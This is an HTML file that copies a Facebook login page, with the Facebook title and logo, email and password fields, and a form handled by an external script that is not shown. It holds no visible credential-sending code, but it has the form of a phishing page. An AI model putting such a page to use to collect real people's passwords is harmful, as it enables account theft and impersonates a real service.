<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="logo.png" alt="Facebook Logo" />
        </div>
        <h2>Log into Facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or Phone Number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <p id="error-message"></p>
        </form>
        <div class="register-link">
            <a href="#">Create New Account</a>
        </div>
        <div class="footer">
            <a href="#">Forgotten password?</a>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
